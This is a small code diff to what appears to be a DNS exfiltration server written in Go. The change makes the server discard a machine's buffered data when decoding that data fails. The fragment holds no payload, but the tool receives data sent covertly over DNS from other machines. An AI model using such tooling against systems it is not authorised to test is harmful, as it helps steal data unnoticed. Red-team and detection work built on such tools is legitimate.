@@ -114,6 +114,7 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 			decodedData, err := decodeFromModifiedBase64(string(ex.unprocessedData[machineId]))
 			if err != nil {
 				log.Println("Unable to decode data for file:", filename)
+				ex.unprocessedData[machineId] = make([]byte, 0)
 				break
 			}
 			_, err = file.Write(decodedData)
